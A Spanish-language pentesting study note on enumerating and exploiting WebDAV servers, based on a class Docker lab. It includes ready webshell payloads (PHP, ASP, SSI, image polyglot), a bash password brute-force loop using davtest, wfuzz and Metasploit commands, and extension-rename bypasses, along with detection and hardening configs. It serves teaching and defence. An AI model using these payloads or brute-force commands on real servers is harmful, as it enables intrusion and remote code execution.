---
tags:
  - ciberseguridad
  - web
  - webdav-explotacion
tipo: concepto
estado: terminado
---

# WebDAV — Enumeración y Explotación

**WebDAV** (*Web Distributed Authoring and Versioning*, RFC 4918) es una extensión de HTTP que convierte un servidor web en un **sistema de archivos remoto colaborativo**: permite listar directorios, crear carpetas, subir, mover, bloquear y versionar recursos **usando verbos HTTP**. Cuando un servidor expone WebDAV sin autorización rigurosa, la enumeración y la explotación son directas: descubrís la estructura, probáis qué extensiones admite el `PUT` y, si el servidor las interpreta, subís una webshell (cadena clásica **PUT → RCE**, profundizada en [[Abuso de Subida de Archivos]]).

## Mecánica: WebDAV sobre HTTP

WebDAV **no es un protocolo aparte**: son verbos HTTP extra sobre el mismo puerto 80/443, con autenticación Basic/Digest habitual. El cliente (cadaver, Explorer de Windows, herramientas de pentest) habla directamente con el vhost.

### Catálogo de métodos

| Método | Función | Ejemplo de uso / abuso |
|---|---|---|
| `OPTIONS` | Enumera los métodos soportados (`DAV:`, `Allow:`) | Reconocimiento inicial: detectar WebDAV |
| `PROPFIND` | Lista propiedades y estructura (`Depth: 0/1/infinity`) | Enumeración de directorios y metadatos |
| `PROPPATCH` | Modifica propiedades de un recurso | Inyectar metadatos, evadir filtros por contenido |
| `MKCOL` | Crea una colección (directorio) | Preparar ruta de subida |
| `PUT` | Sube un archivo al servidor | **Vector principal**: subir webshell |
| `GET` | Descarga (HTTP estándar) | Descargar archivos filtrados |
| `DELETE` | Borra recursos | Destrucción / limpieza de rastros |
| `COPY` | Copia un recurso (`Destination:`) | Copiar shell a extensión interpretable |
| `MOVE` | Mueve/renombra (`Destination:`) | **Bypass de whitelist**: `shell.txt` → `shell.php` |
| `LOCK`/`UNLOCK` | Bloquea/desbloquea recursos | Exclusión, DoS sobre archivos legítimos |
| `REPORT`, `CHECKIN/OUT`, `VERSION-CONTROL` | Versionado (DeltaV) | Fuga de versiones previas de archivos |

### Códigos de estado relevantes

| Código | Significado | Lectura para el atacante |
|---|---|---|
| `200` / `207 Multi-Status` | PROPFIND OK / resultado XML multi-status | Tienes enumeración |
| `201 Created` | PUT/MKCOL creó el recurso | Subida aceptada |
| `401` | Falta autenticación | Hay auth: probar credenciales |
| `403` | Autenticado pero sin permiso | Credencial válida o permiso insuficiente |
| `405 Method Not Allowed` | Verb no habilitado | Mirar `Allow`: ahí está el menú |
| `507 Insufficient Storage` | Sin espacio | El endpoint de subida existe |

> [!tip] Detección inicial
> `curl -X OPTIONS http://target/ -i` → cabeceras `DAV: 1,2` y `Allow: GET, POST, OPTIONS, TRACE, PUT, DELETE, PROPFIND...`. WhatWeb (ver [[WhatWeb Herramienta de Fingerprinting]]), Nikto y Nmap (`http-enum`, `http-put`, `http-dav`) lo detectan también. Si `OPTIONS` lista `PROPFIND`, tenés WebDAV confirmado aunque el `GET` pida login.

## Metodología de enumeración y explotación

1. **Descubrir**: WhatWeb/Nmap o `OPTIONS` directo. Identificar software (`Server:`, `X-Powered-By`, cabecera `DAV`).
2. **Enumerar estructura**: `PROPFIND -H "Depth: 1" http://target/` — filtra nombres de carpetas y archivos; busca `web.config`, `.htaccess`, backups y directorios de uploads.
3. **Probar autenticación**: sin credenciales primero (¿anónimous read/write?), luego credenciales por defecto (`admin:admin`, `administrator`, usuario del servicio) y, si procede, fuerza bruta acotada (ver [[Gestión de Autenticación]]).
4. **Probar permisos de escritura**: `davtest` — sube y **ejecuta** archivos de prueba con ~30 extensiones (php, asp, aspx, jsp, cgi, shtml, txt, html...). La tabla resultado es tu plan de explotación.
5. **Explotar RCE**: si la extensión interpretable está permitida, PUT de shell; si solo acepta extensiones "inofensivas", prueba `MOVE`/`COPY` para renombrar a `.php`/`.asp`, o bypasses (`.phtml`, `.php5`, `.phar`, `.shtml` con SSI, polyglot imagen).
6. **A por la flag**: una vez RCE, escala según [[Local File Inclusion]] / subida de archivos, o lee directamente los archivos objetivo.

### Cadena PUT → RCE

| Escenario | Payload | Condición |
|---|---|---|
| PHP directo | `PUT /uploads/shell.php` con `<?php system($_GET['c']); ?>` | Apache ejecuta PHP en esa ruta |
| Rename bypass | `PUT /uploads/shell.txt` → `MOVE` a `/uploads/shell.php` | MOVE habilitado y destino sin validar |
| IIS | `PUT /uploads/shell.asp` (`<%eval request("c")%>`) | IIS con script maps |
| SSI | `PUT /uploads/x.shtml` con `<!--#exec cmd="id" -->` | Includes del servidor habilitados |
| Extensiones alternativas | `.phtml`, `.php3/4/5/7`, `.phar`, `.inc` | Mapeo activo del intérprete |
| Polyglot imagen | `GIF89a<?php ...` en `shell.gif` | Si la ejecuta como PHP |

## Herramientas

| Herramienta | Uso | Flags / comandos clave |
|---|---|---|
| `davtest` | Prueba subida **y ejecución** por extensión | `davtest -url http://t -auth user:pass`, `-sendbd` (auto-PUT de shell), `-write`/`-read` |
| `cadaver` | Cliente interactivo tipo FTP | `open http://t`, `ls`, `put f`, `get f`, `mkdir d`, `mv a b`, `propmod` |
| `wfuzz` | Fuerza bruta de credenciales | `wfuzz -w rockyou.txt --hc 401 -H "Authorization: Basic Zm9vOmJhcg==" http://t/` |
| Nmap scripts | Enumeración y abuso | `nmap -sV --script http-enum,http-put,http-dav target` |
| Metasploit | Autopwn / explotación | `auxiliary/scanner/http/http_options`, `exploit/multi/http/dav_autopwn`, `exploit/windows/iis/iis_webdav_storage` (CVE-2017-7269) |
| Burp Suite | PROPFIND/PUT manual + fuzzing | Repeater + Intruder sobre credenciales y rutas |

## Base original de clase

A continuación, los fundamentos y la práctica Docker originales de la nota:


**WebDAV** (**Web Distributed Authoring and Versioning**) es una extensión del protocolo HTTP que permite a los usuarios **acceder** y **manipular** **archivos** en un servidor web a través de una conexión segura.

> [!info] **Funcionamiento de WebDAV**
> WebDAV extiende HTTP con métodos adicionales como `PROPFIND` (para recuperar propiedades de recursos), `PROPPATCH` (para modificar propiedades), `MKCOL` (para crear colecciones/directorios), `COPY`, `MOVE`, `LOCK`, y `UNLOCK`. Estos métodos facilitan la gestión de archivos y directorios directamente desde clientes compatibles, como exploradores de archivos o herramientas de desarrollo.

Cuando hablamos de enumerar un servidor WebDAV, nos referimos al proceso de recopilar información sobre los recursos disponibles en el servidor WebDAV. Los atacantes pueden utilizar herramientas de enumeración de WebDAV para buscar recursos protegidos en el servidor, como archivos de configuración, contraseñas y otros datos confidenciales. La información recopilada durante la enumeración puede ser utilizada por los atacantes para planificar ataques más sofisticados contra el servidor.

> [!warning] **Riesgos de la Enumeración WebDAV**
> La enumeración exitosa de un servidor WebDAV puede revelar la estructura de directorios, nombres de archivos sensibles, versiones de software y configuraciones que pueden ser explotadas. Esto es un paso crítico en la fase de reconocimiento para identificar posibles vectores de ataque.

Asimismo, esta fase inicial de reconocimiento implica el intento de identificar las **extensiones de archivo** permitidas en el servidor. Una vez detectadas las extensiones de archivo permitidas, los atacantes pueden aprovecharse de esto para cargar y ejecutar archivos que contengan código malicioso. Si los archivos maliciosos se cargan y ejecutan con éxito en el servidor web, los atacantes pueden obtener acceso no autorizado al servidor y comprometer la seguridad del sistema.

> [!tip] **Vectores de Explotación Comunes**
> La capacidad de subir archivos con extensiones específicas (ej. `.php`, `.asp`, `.jsp`) es un vector de ataque directo para la ejecución remota de código (RCE). Si el servidor permite la subida de estos archivos y los interpreta, un atacante puede subir una shell web para obtener control sobre el servidor.

Una de las herramientas que vemos en esta clase es **Davtest**. La herramienta Davtest es una herramienta de línea de comandos que se utiliza para realizar pruebas de penetración en servidores WebDAV. Davtest puede utilizarse para enumerar recursos protegidos en un servidor WebDAV, así como para probar la configuración de seguridad del servidor. Davtest también puede utilizarse para probar la autenticación y la autorización del servidor, y para detectar vulnerabilidades conocidas.

Otra de las herramientas que vemos en esta clase es **Cadaver**. Cadaver es otra herramienta de línea de comandos que se utiliza para interactuar con servidores WebDAV. Cadaver permite a los usuarios navegar por los recursos del servidor, cargar y descargar archivos, y ejecutar comandos en el servidor. Cadaver también puede utilizarse para realizar pruebas de penetración en servidores WebDAV, como la enumeración de recursos protegidos y la explotación de vulnerabilidades conocidas.

Para prevenir la enumeración y explotación de WebDAV, es importante que los administradores de sistemas implementen medidas de seguridad adecuadas en el servidor. Esto puede incluir la limitación de los recursos disponibles en el servidor y la utilización de autenticación y autorización fuertes. Además, es importante que los usuarios protejan sus contraseñas y eviten el uso de contraseñas débiles o fáciles de adivinar.

### Notas de práctica — lab Docker (material original)

Nos hemos montado con Docker un WebDAV para practicar y, al intentar verlo mediante el navegador, nos pide credenciales:

![[Pasted image 20260227161233.png]]

Lo que tenemos que hacer es primero enumerar, y podemos hacerlo con [[WhatWeb Herramienta de Fingerprinting|WhatWeb, Fingerprinting Web]]:

![[Pasted image 20260227161334.png]]

Como observamos, la herramienta nos detecta que es un WebDAV y que, además, no tenemos permisos.

Vamos a usar una herramienta llamada `davtest` que nos permite, mediante credenciales válidas, subir múltiples archivos con diferentes extensiones con el objetivo de identificar cuáles nos permite, qué archivos son interpretados, cuáles son solo almacenados y más.

![[Pasted image 20260227161648.png]]

Como vemos, intentamos con credenciales no válidas y no podemos hacer mucho. En caso de ser correctas, sería:

![[Pasted image 20260227161802.png]]

Como podemos observar, nos muestra los archivos que intenta subir mediante el método `PUT`, luego los intenta ejecutar y al final nos indica todos los archivos que fue posible subir y los que fue posible ejecutar.

> [!info] **Análisis de `davtest`**
> `davtest` es una herramienta crucial para identificar la configuración de un servidor WebDAV. No solo prueba la capacidad de subir archivos, sino que también intenta ejecutar diferentes tipos de archivos (ej. `.php`, `.pl`, `.asp`) para determinar si el servidor los procesa. Esto es fundamental para identificar posibles vulnerabilidades de ejecución remota de código. Los resultados detallados sobre qué extensiones son permitidas y ejecutables son la clave para una explotación exitosa.

En el caso de no tener la contraseña, podemos hacer fuerza bruta de forma rápida y manual aprovechando la herramienta `davtest` de la siguiente manera:

```bash
cat /usr/share/seclists/Passwords/Leaked-Databases/rockyou-15.txt | while read password; do response=$(davtest -url http://127.0.0.1 -auth admin:$password 2>&1 | grep -i succeed); if [ $response ]; then echo "[+] La contraseña es: $password"; break; fi; done
```

![[Pasted image 20260227163905.png]]

> [!warning] **Consideraciones sobre Fuerza Bruta**
> La fuerza bruta es una técnica ruidosa y puede ser detectada por sistemas de detección de intrusiones (IDS/IPS) o bloqueada por mecanismos de bloqueo de cuentas. Es importante considerar la legalidad y las implicaciones éticas antes de realizar ataques de fuerza bruta en entornos no autorizados. En un laboratorio controlado, es una técnica válida para aprender.

Ahora, para interactuar con la máquina ya teniendo la contraseña, podemos usar `cadaver` para interactuar de forma más manual:

![[Pasted image 20260227164038.png]]

> [!tip] **Uso de `cadaver`**
> `cadaver` proporciona una interfaz de línea de comandos similar a un cliente FTP para interactuar con servidores WebDAV. Permite operaciones como `ls` (listar), `get` (descargar), `put` (subir), `cd` (cambiar directorio), `mkdir` (crear directorio), entre otras. Es extremadamente útil para la gestión manual de archivos y la exploración del sistema de archivos del servidor WebDAV una vez que se ha obtenido acceso.
## Detección (defensor)

| Señal | Riesgo |
|---|---|
| Cabecera `DAV:` en respuestas a OPTIONS | WebDAV expuesto |
| `Allow` incluye PUT/DELETE/PROPFIND accesibles anónimos | Escritura anónima directa |
| `207` con listado completo a usuarios anónimos | Enumeración libre |
| Archivos `.php/.asp/.aspx` en directorios de uploads | RCE inminente |
| Usuario administrador sin 2FA + WebDAV autenticable | Fuerza bruta → RCE |
| Log con ráfagas de `PROPFIND`/`PUT` fallidos | Exploración/ataque activo |

## Impacto y riesgo

- **RCE completo** vía PUT + intérprete (el techo del impacto web): webshell persistente, pivote interno.
- Lectura/escritura/borrado arbitrario: exposición de código fuente, `.git`, configs y backups (conexión con [[Local File Inclusion]] y [[Information disclosure]]).
- Backdoors persistentes y suplantación de archivos legítimos (`MOVE` sobre recursos existentes).

## Defensa (con configuración)

### 1. Deshabilitar WebDAV por completo (lo normal)

```apache
# Apache — denegar todo verb que no sea lectura básica
<LimitExcept GET POST HEAD OPTIONS>
    Require all denied
</LimitExcept>
# Con módulo DAV instalado:
<IfModule mod_dav.c> DAVOff </IfModule>
```

```nginx
# Nginx no trae WebDAV nativo (el módulo nginx-dav es de terceros): basta con no instalarlo
# y bloquear verbos desconocidos:
if ($request_method !~ ^(GET|HEAD|POST|OPTIONS)$) { return 405; }
```

```xml
<!-- IIS — quitar el handler WebDAV y filtrar verbos en web.config -->
<system.webServer>
  <handlers>
    <remove name="WebDAV" />
  </handlers>
  <security>
    <requestFiltering>
      <verbs allowUnlisted="false">
        <add verb="GET" allowed="true" />
        <add verb="POST" allowed="true" />
      </verbs>
    </requestFiltering>
  </security>
</system.webServer>
```

### 2. Si WebDAV es un requisito de negocio

- Autenticación fuerte obligatoria (no Basic sobre HTTP plano; Digest como mínimo, ideal TLS + tokens) y cuentas dedicadas con permisos mínimos.
- Escritura solo en directorios de uploads, con `PUT` limitado por extensión **y** por contenido (validación en la capa de la app, no solo en el verb).
- Directorios de subida fuera del árbol servible y sin ejecución de intérpretes (ver [[Abuso de Subida de Archivos]]).
- Auditoría y alertas sobre `PROPFIND`, `PUT`, `MOVE` y `DELETE` en los logs del proxy.

## Errores comunes

**Atacante:**
1. Olvidar `OPTIONS`/`PROPFIND Depth` y concluir "no hay WebDAV" porque el GET pide login.
2. Asumir que `405` en PUT significa "no escribo": el verb puede estar bloqueado pero `MOVE` o `COPY` abiertos.
3. Fuerza bruta sin control: bloqueo de cuenta/IP (ver [[Gestión de Autenticación]]).
4. Subir la shell sin verificar ejecución: `davtest` distingue *subido* de *ejecutado* — mira la columna "Exec".

**Defensor:**
1. Instalar el módulo DAV por defecto "por compatibilidad".
2. Permitir `PUT` anónimo en `/uploads` sirviendo esa ruta con el intérprete activo.
3. No registrar ni alertar sobre verbos DAV.
4. Credenciales por defecto del servicio (`admin`/`admin`) sin rotar.

## Cheatsheet

```http
OPTIONS / HTTP/1.1                          -> DAV:, Allow:
PROPFIND / HTTP/1.1  Depth: 1               -> 207 Multi-Status con la estructura
PUT /uploads/t.txt HTTP/1.1                 cuerpo: test
MOVE /uploads/t.txt HTTP/1.1                Destination: /uploads/t.php
```

```bash
davtest -url http://target -auth admin:password
cadaver http://target            # ls / put / get / mv / mkdir
wfuzz -w rockyou.txt --hc 401 -H "Authorization: Basic ..." http://target/
nmap -sV --script http-enum,http-put,http-dav target
msfconsole -q -x "use auxiliary/scanner/http/http_options; set RHOSTS target; run"
```

## Laboratorios y referencias

- RFC 4918 (WebDAV): https://datatracker.ietf.org/doc/html/rfc4918
- HackTricks — WebDAV pentesting: https://book.hacktricks.wiki/en/pentesting-web/webdav-protocol-pentesting.html
- Davtest (Kali): https://www.kali.org/tools/davtest/
- Cadaver: https://cadaver.uriap.com/
- DVWA / imágenes Docker `byjokiko/webdav` o `makiso/webdav` para practicar (el lab de la clase)

## Relacionadas

- [[Abuso de Subida de Archivos]] — el PUT es, al final, una subida de archivos
- [[Local File Inclusion]] — lectura de archivos tras obtener permiso de escritura/acceso
- [[Gestión de Autenticación]] — la barrera entre "enumero" y "exploto"
- [[Information disclosure]] — PROPFIND sin permisos es enumeración pura
- [[WhatWeb Herramienta de Fingerprinting]] — fingerprinting inicial que detecta WebDAV
